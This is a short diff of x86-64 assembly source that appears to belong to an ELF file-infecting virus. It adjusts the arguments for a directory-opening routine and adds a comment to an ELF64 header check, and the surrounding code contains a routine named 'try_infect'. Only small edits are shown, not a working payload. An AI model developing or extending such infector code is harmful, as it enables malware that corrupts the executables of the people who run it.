@@ -194,8 +194,8 @@ _start:
         mov r14, rdi
 
         mov rsi, O_DIRECTORY | O_RDONLY
-        lea rdx, [rel .close_directory]
-        xor rcx, rcx
+        mov rcx, .next_directory
+        xor rdx, rdx
         call try_open
 
         mov data(dir_fd), rax
@@ -314,6 +314,7 @@ try_infect:
     .return:
         ret
 
+; bool is_elf64(rdi=Elf64_Ehdr*)
 is_elf64:
     xor rax, rax
     cmp QWORD [rdi + 8], rax
